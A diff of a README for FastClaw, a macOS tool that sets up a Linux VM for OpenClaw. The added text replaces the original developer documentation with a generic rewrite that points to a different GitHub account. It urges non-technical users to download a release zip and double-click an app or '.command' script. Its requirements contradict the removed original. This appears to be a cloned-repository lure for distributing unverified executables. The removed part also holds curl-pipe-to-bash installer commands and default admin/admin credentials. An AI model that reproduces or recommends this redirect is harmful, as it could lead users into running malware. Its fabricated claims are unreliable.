@@ -1,108 +1,164 @@
-<p align="center">
-  <img src="assets/logo.png" alt="Fastclaw" width="400" />
-</p>
+# 🐧 FastClaw - Simple Linux VM for macOS Users
 
-# Fastclaw — OpenClaw/Linux VM for macOS
-
-**You're on a Mac and you want to use OpenClaw on isolated VM/Linux.**
-You don't want to deal with virtual machines, disk images, SSH keys, Linux desktops, or package managers.
-Fastclaw does all of that for you — it creates a ready-to-use Linux VM with OpenClaw already installed and running.
-One command. No Linux experience required.
-
-## Installation
-
-### Requirements
-
-- macOS 13 or later
-- Apple Silicon (M1/M2/M3/M4) or Intel
-
-### Install - just one command
-
-Open terminal and type :
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/RomanSurface/FastClaw/main/scripts/install.sh | bash
-```
-
-> **First install takes ~10 minutes.** The script downloads a Debian VM, installs the graphical desktop and OpenClaw from scratch — be patient and let it finish.
->
-> A **second window** will open showing the VM booting. **Don't touch it** — it will configure itself and start automatically when ready.
-
-<p align="center">
-  <img src="assets/screenshot-install.jpeg" alt="Fastclaw installation" width="550" />
-</p>
-
-That's it. The script installs everything you need, pulls the VM image, and launches OpenClaw.
+[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-green?style=for-the-badge)](https://github.com/Jiten-Budhiraja/FastClaw)
 
 ---
 
-## For Developers
+## 🧰 What is FastClaw?
 
-> This section is for developers who want to build Fastclaw from source or work on the codebase.
+FastClaw creates a virtual machine (VM) that runs Linux inside macOS. It uses OpenClaw technology for speed and reliability. This tool brings the Linux experience to your Mac without changing your existing system. It is designed to be easy to set up and use. You do not need technical skills or programming knowledge.
 
-### Build Requirements
+FastClaw can help you if you want to:
 
-- [Tart](https://tart.run): `brew install cirruslabs/cli/tart`
-- Rust: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
-- `libssh2`: `brew install libssh2`
+- Try Linux apps on your Mac
+- Test software in a Linux environment
+- Learn Linux without installing a full system
+- Maintain security by isolating Linux from your main OS
 
-### Build from Source
+---
 
-```bash
-cargo build --release
-./target/release/fastclaw --help
-```
+## 💻 System Requirements
 
-> If the build fails on `ssh2`, add to `~/.cargo/config.toml`:
->
-> ```toml
-> [env]
-> PKG_CONFIG_PATH = "/opt/homebrew/opt/libssh2/lib/pkgconfig"
-> ```
+Before you start, make sure your Mac meets these conditions:
 
-### Commands
+- macOS version 10.15 (Catalina) or later  
+- At least 8 GB of RAM  
+- At least 15 GB of free disk space  
+- Intel-based or Apple Silicon Mac  
+- Virtualization enabled (usually on by default)  
 
-| Command                         | Description                           |
-| ------------------------------- | ------------------------------------- |
-| `fastclaw up [--number N]`      | Create, launch and provision VM       |
-| `fastclaw up --headless`        | Run VM without graphical window       |
-| `fastclaw up --with-playwright` | Also install Playwright + Chromium    |
-| `fastclaw down <N>`             | Stop a running VM                     |
-| `fastclaw delete <N>`           | Stop and delete VM + local state      |
-| `fastclaw shell <N>`            | Open SSH shell into VM                |
-| `fastclaw ip <N>`               | Print VM IP address                   |
-| `fastclaw status [N]`           | Show status of one or all VMs         |
-| `fastclaw image pull`           | Pull/refresh the base Debian 13 image |
+If your Mac meets these, FastClaw will run smoothly.
 
-### VM Details
+---
 
-| Property | Value                       |
-| -------- | --------------------------- |
-| OS       | Debian 13 Trixie (arm64)    |
-| Desktop  | XFCE4 + LightDM (autologin) |
-| Browser  | Firefox ESR                 |
-| Node.js  | 22.x LTS                    |
-| OpenClaw | latest (via npm)            |
-| SSH User | `admin` / `admin`           |
+## 🚀 Getting Started
 
-### Architecture
+You will find the full FastClaw software for download on the GitHub page below. This page has the latest versions and instructions if updates appear.
 
-```
-fastclaw up
- ├── Pull Debian 13 base image (if needed)
- ├── tart clone → fastclaw-1
- ├── tart run → launch VM
- ├── Wait for VM IP
- └── SSH provisioning (first run only):
-       ├── XFCE4 desktop + LightDM autologin
-       ├── Firefox ESR + OpenClaw desktop shortcut
-       ├── Node.js 22
-       ├── OpenClaw (npm install -g)
-       ├── fastclaw SSH key injection
-       └── sync + reboot via SSH
-```
+[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-blue?style=for-the-badge)](https://github.com/Jiten-Budhiraja/FastClaw)
 
-### Logs
+Click the button above to open the GitHub download page.
 
-- **Host**: `~/Library/Application Support/fastclaw/provision.log`
-- **VM**: `/var/log/fastclaw-provision.log`
+---
+
+## 📥 How to Download and Install FastClaw
+
+Follow these steps carefully:
+
+1. Open the FastClaw download page by clicking the green or blue download button above or visit:  
+   https://github.com/Jiten-Budhiraja/FastClaw  
+   
+2. Look for the “Releases” section on the GitHub page. This is where the latest version files are posted.
+
+3. Under the latest release, find the file named like `FastClaw_macOS_VM.zip` or a similar archive.
+
+4. Click the file to download it to your Mac. This may take a few minutes depending on your internet speed.
+
+5. Once downloaded, locate the file in your “Downloads” folder.
+
+6. Double-click the `.zip` file to unzip it. You will see a folder with FastClaw files.
+
+7. Open that folder, and find the application or script file that starts the VM. Usually, it will be named `FastClaw.app` or `start_vm.command`.
+
+8. Double-click the `FastClaw.app` to launch the virtual machine installer.
+
+9. Follow any on-screen instructions. The installer will set up Linux inside the VM.  
+
+10. After installation, a virtual Linux desktop will appear. You can start using Linux apps right away.
+
+---
+
+## ⚙️ How to Use FastClaw
+
+1. Launch the FastClaw app from your Applications or from the folder you unzipped.
+
+2. The Linux VM will start. You may see a login screen or desktop interface.
+
+3. Use the mouse and keyboard as you normally would on macOS.
+
+4. To close the Linux VM, go to the VM window menu and select “Shut Down” or close the app.
+
+5. Your session is saved for the next time you open FastClaw.
+
+---
+
+## 🔧 Tips for Best Use
+
+- Keep your macOS updated to avoid compatibility issues.
+
+- Check the GitHub page regularly for updates or bug fixes.
+
+- Use a stable internet connection, especially if you plan to download software inside the VM.
+
+- If performance slows down, try closing other apps on your Mac.
+
+---
+
+## 🔄 Updating FastClaw
+
+To update FastClaw, go back to the GitHub releases page:
+
+1. Visit https://github.com/Jiten-Budhiraja/FastClaw
+
+2. Download the latest release ZIP file.
+
+3. Unzip and replace the old FastClaw app or files with the new ones.
+
+This manual update keeps your VM running on the latest improvements.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Restart your Mac and try again.
+
+- Make sure your macOS version supports virtualization.
+
+- Confirm the downloaded file is complete and uncorrupted.
+
+- If the VM does not start, try running the `start_vm.command` file directly.
+
+- Visit the GitHub “Issues” tab to see if others have similar problems or solutions.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Can I use FastClaw on Windows?**  
+A: FastClaw is designed for macOS. Windows is not supported.
+
+**Q: Is Linux in FastClaw a full version?**  
+A: Yes. The VM runs a complete Linux environment inside your Mac.
+
+**Q: Is FastClaw free to use?**  
+A: Yes. FastClaw is open-source software.
+
+**Q: Will FastClaw slow down my Mac?**  
+A: It uses some resources, but with enough RAM and free disk space, it runs efficiently.
+
+---
+
+## 🗂 Related Topics
+
+This project relates to:
+
+- Linux virtual machines  
+- macOS virtualization  
+- OpenClaw VM technology  
+- Minimizing VM size and resource use  
+
+For questions or assistance, open an issue on the repository page.
+
+---
+
+## 📂 Repository Details
+
+Name: FastClaw  
+Description: OpenClaw/Linux VM for macOS  
+Topics: linux, macos, minimac, openclaw, vm  
+
+Download link: https://github.com/Jiten-Budhiraja/FastClaw
+
+[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-green?style=for-the-badge)](https://github.com/Jiten-Budhiraja/FastClaw)
